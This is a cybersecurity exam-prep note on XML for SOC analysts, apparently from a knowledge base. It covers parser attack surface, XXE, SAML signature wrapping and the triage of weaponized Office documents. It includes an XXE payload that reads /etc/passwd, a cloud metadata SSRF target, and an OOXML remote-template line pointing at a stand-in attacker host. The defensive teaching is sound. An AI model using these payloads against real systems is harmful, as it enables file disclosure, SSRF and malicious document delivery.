# XML — Extensible Markup Language

## What it is

In **Battlefield 2042**, every weapon, gadget, and vehicle has a Plus menu — you hold a key and a tree of attachments expands: optic, barrel, magazine, underbarrel. Each node is labeled, nested, and the game engine reads the whole tree to figure out what your gun actually does this round. Swap the magazine node, the engine re-parses the loadout, the gun behaves differently. That tree — labeled tags wrapping nested values — is XML. The engine doesn't care what's *in* the tags, only that the structure parses cleanly.

That's XML in plain English: a text format that wraps data in named tags so machines can parse it without guessing. Humans can read it. Programs can validate it against a schema. It's been the data interchange format of choice for SOAP services, configuration files, Microsoft Office documents (every `.docx` is a zip of XML), SAML assertions, and SIEM rule exports since the late 90s.

**Technical definition (CS0-003):** XML is a W3C markup language that encodes structured data in nested element tags, optionally validated against a Document Type Definition (DTD) or XML Schema (XSD). For the analyst, XML matters because **the parser is attack surface** — XXE (XML External Entity), XML injection, XSLT injection, and billion-laughs DoS all live in how the parser handles tags, entities, and references the document author should not be allowed to define.

## Why it matters

Half the enterprise still runs on XML even when the cool kids moved to [[JSON]]. SAML federation? XML. SOAP web services in your finance system? XML. Office macros and the OOXML format Word and Excel ride on? XML inside a zip. SIEM detection rules in Sigma, Snort signatures exported from a manager, STIX 1.x threat intel feeds? XML or XML-adjacent.

When a phishing payload lands on a finance user's box and the malware drops a weaponized `.docx`, you are reverse-engineering XML inside the OOXML container. When a SaaS vendor's SAML implementation gets popped, the bug is almost always XML signature validation. When the pentest report comes back with "XXE on the document upload endpoint" — that's the parser trusting an attacker-controlled external entity reference and reading `/etc/passwd` or beaconing out to an attacker-controlled DNS for SSRF.

CS0-003 Objective 1.3 puts XML in the **file analysis / programming languages / scripting** cluster — you're expected to read it, recognize when it's hostile, and know what tooling pulls it apart.

## Key facts

### Anatomy of an XML document

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE loadout [
  <!ENTITY weapon "M5A3">
]>
<loadout id="alpha">
  <primary>&weapon;</primary>
  <optic zoom="4x">Fusion Holo</optic>
</loadout>
```

| Part | What it is | Why it matters |
|---|---|---|
| **Prolog** (`<?xml ...?>`) | Declares version + encoding | Encoding mismatches break parsers and hide payloads |
| **DOCTYPE / DTD** | Declares entities and document structure | **This is where XXE lives.** Disable external DTDs. |
| **Entity** (`&weapon;`) | Named substitution token | Entities can reference external URIs — that's the bug |
| **Element** (`<primary>`) | Tagged data node | Nestable, attributable, the actual payload |
| **Attribute** (`id="alpha"`) | Key-value pair on an element | Cheap channel for smuggled data |

### XXE — XML External Entity injection

The textbook attack and the one CompTIA loves. A parser that resolves external entities will fetch whatever URI you point it at:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

The parser dutifully reads `/etc/passwd` and inlines it into the response. Pivot variations:

- **File disclosure** — `file:///` to read local files
- **SSRF** — `http://169.254.169.254/...` to hit cloud metadata endpoints
- **Blind XXE** — exfil via DNS lookups to attacker-controlled domain (relevant for [[C2 traffic]] detection — outbound DNS to weird domains from your web tier)
- **Billion laughs / quadratic blowup** — recursive entity expansion to DoS the parser

> **CompTIA exam trap:** XXE is *not* the same as XML injection. **XXE** abuses the DTD/entity resolver to read files or reach internal services. **XML injection** is unsanitized user input breaking out of its expected element — closer in spirit to SQLi. Both are XML-family bugs; CompTIA will give you a snippet and ask which one. If you see `<!ENTITY ... SYSTEM "...">`, it's XXE.

### XML vs JSON — the comparison CompTIA loves

| Property | XML | JSON |
|---|---|---|
| Syntax | Tag-based, verbose | Key-value, lightweight |
| Schema | XSD, DTD | JSON Schema (optional) |
| Comments | Yes (`<!-- -->`) | No (officially) |
| Attributes | Yes | No, key-value only |
| External refs | Yes (entities) — **XXE risk** | No native mechanism |
| Typical use | SOAP, SAML, OOXML, config | REST APIs, modern web |
| Parser attack surface | Large (DTD, XSLT, namespaces) | Smaller, but injection still possible |

The short version for the exam: **JSON is leaner, XML is older and more dangerous, both are everywhere.**

### Where the analyst encounters XML

- **OOXML files** (`.docx`, `.xlsx`, `.pptx`) — unzip and you get a folder of XML. Macros live in `vbaProject.bin`, but the relationships (`_rels/.rels`) and template injection paths (`settings.xml.rels`) are pure XML. Weaponized docs often pivot through `<Relationship Target="http://attacker/template.dotm" TargetMode="External"/>`.
- **SAML assertions** — the federation token your SSO rides on. XML signature wrapping (XSW) attacks let an adversary inject a forged assertion the parser validates but the application reads.
- **Sigma rules** — YAML now, but legacy SIEM rule sets, Snort/Suricata signature exports, and STIX 1.x intel feeds are XML.
- **Sysmon configs** — the policy file telling Sysmon what to log on the endpoint is XML. Tuning is editing XML.
- **App configs** — `web.config`, Tomcat `server.xml`, Spring beans. Misconfigurations here are pentest gold.

### Tools that touch XML in the SOC

| Tool | What it does with XML |
|---|---|
| **[[strings]]** | First pass on a suspicious doc — pull readable XML out of binary blobs |
| **[[Wireshark]]** | Decodes SOAP, SAML, and XML-RPC on the wire; right-click → "Follow → HTTP Stream" |
| **[[VirusTotal]]** | Hashes the file, but also parses OOXML structure and flags weaponized relationships |
| **[[Cuckoo Sandbox]] / [[Joe Sandbox]]** | Detonates the doc, watches for XML-driven template injection or external entity fetches |
| **xmllint** | Command-line validator — `xmllint --noent` will *resolve* entities (don't run it blind on hostile XML) |
| **oletools (oledump, olevba)** | Pulls macros and XML relationships out of Office docs |
| **[[Regular expressions]]** | Grepping XML is fragile — use a proper parser. CompTIA will test that you know this. |

### Reading hostile XML — quick checklist

1. **Look at the DOCTYPE first.** Is there one? Does it declare external entities? If yes, this document expects to fetch something. That's the bug or the IoC.
2. **Check encoding.** UTF-7 and weird encodings are used to slip past naive WAF rules.
3. **Walk the namespace declarations.** `xmlns:` pointing at attacker-controlled URIs is a red flag in SAML and SOAP.
4. **For OOXML:** unzip, look at `word/_rels/document.xml.rels` and `word/_rels/settings.xml.rels` for `TargetMode="External"` with HTTP targets.
5. **Hash everything** ([[hashing]] — SHA-256) before you modify a single byte. Chain of custody starts at first touch.

### CompTIA exam traps

> **CompTIA exam trap:** If a question shows you a SAML assertion and asks how the attacker bypassed auth, the answer is almost always **XML signature wrapping** or **XXE in the SAML processor** — not "they stole the password." Federation bugs are XML parser bugs.

> **CompTIA exam trap:** "Which is more secure, XML or JSON?" is a bad question, and CompTIA *will* ask it. The right framing on the exam: **JSON has less parser attack surface** (no DTD, no entities, no external refs by default). That's the answer they want. In reality, both can be misparsed; security is in the parser config, not the format.

> **CompTIA exam trap:** Don't confuse **XSLT** (stylesheet transformation language, also an injection target) with **XSS** (cross-site scripting). XSLT injection in an XML pipeline can achieve RCE on some processors. XSS is a browser-side problem. CompTIA mixes these on purpose.

## SOC reality

- The 3am alert: EDR flags `winword.exe` spawning `cmd.exe` which spawns `powershell.exe -enc <base64>`. You pull the original `.docx`, unzip it, and the smoking gun is one line in `settings.xml.rels` pointing at an attacker-hosted template. The XML *is* the IoC.
- The L1 first action: hash the file (SHA-256), submit to [[VirusTotal]], check [[AbuseIPDB]] for the external URI, queue the email for [[email analysis]] of [[header]] and [[SPF]]/[[DKIM]]/[[DMARC]] alignment. **Do not** open the doc on your workstation. Detonate in [[sandboxing]] if you need behavior — Joe or Cuckoo.
- What the IR lead asks: "Who else got the email? What's the SPF disposition? Did anyone open it? Did the template URL resolve from inside our network, and what did it return?" Scope, impact, evidence preserved — in that order.
- Never tell the CISO "it's just a Word doc." OOXML is a zip of XML and XML is a programmable attack surface. *I learned this watching a finance controller's box get popped because someone called a remote-template phish "low severity" on first triage.*
- The handoff: L1 confirms the IoC and pulls related emails via the mail gateway. L2 reverse-engineers the macro and the XML relationships, pulls the C2 infrastructure, and feeds it to threat intel. IR scopes blast radius. If SAML or federation is involved, legal and identity team get pulled in immediately — federated trust failures are crown-jewel incidents.

## Related concepts

[[JSON]] · [[SAML]] · [[XXE]] · [[Email analysis]] · [[Sandboxing]] · [[Joe Sandbox]] · [[Cuckoo Sandbox]] · [[VirusTotal]] · [[Wireshark]] · [[Strings]] · [[Hashing]] · [[Regular expressions]] · [[PowerShell]] · [[Python]] · [[DKIM]] · [[DMARC]] · [[SPF]] · [[File analysis]] · [[C2 traffic]] · [[MITRE ATT&CK]]

*Source: VIRGIL knowledge base — 2026-05-11*